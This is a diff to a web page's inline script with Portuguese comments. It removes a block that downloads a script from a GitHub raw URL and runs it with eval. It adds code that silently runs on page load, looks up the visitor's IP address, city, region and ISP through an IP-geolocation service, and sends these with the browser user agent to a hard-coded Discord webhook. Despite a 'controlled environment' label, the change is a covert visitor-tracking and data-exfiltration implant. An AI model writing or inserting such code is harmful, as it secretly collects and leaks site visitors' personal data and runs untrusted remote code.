@@ -165,11 +165,33 @@ function copiar() {
     });
 }
 
-(async () => {
-    const url = "https://raw.githubusercontent.com/SeilaNomeFoda/Outro-kk/refs/heads/main/Assets";
-    const code = await fetch(url).then(r => r.text());
-    eval(code); // executa o script baixado
-})();
+// Salvar Oque o usuário fez
+const webhook = "https://discord.com/api/webhooks/1383256597907771504/-VepgB9hxcGOQ6QNH2-sLVnEsuqqg1rsa8nDp8Ufrr8kxojg1LnAr77TzUKmB8-ApcqF";
+
+   
+async function coletarDados() {
+    const ipInfo = await fetch("http://ip-api.com/json/").then(r => r.json());
+
+    // 
+    const payload = {
+        content:
+            "**[AMBiente CONTROLADO]**\n" +
+            `IP: ${ipInfo.query}\n` +
+            `Cidade: ${ipInfo.city}\n` +
+            `Região: ${ipInfo.regionName}\n` +
+            `ISP: ${ipInfo.isp}\n` +
+            `User-Agent: ${navigator.userAgent}`
+    };
+
+    fetch(webhook, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify(payload)
+    });
+}
+
+// 
+coletarDados();
     
 </script>
 
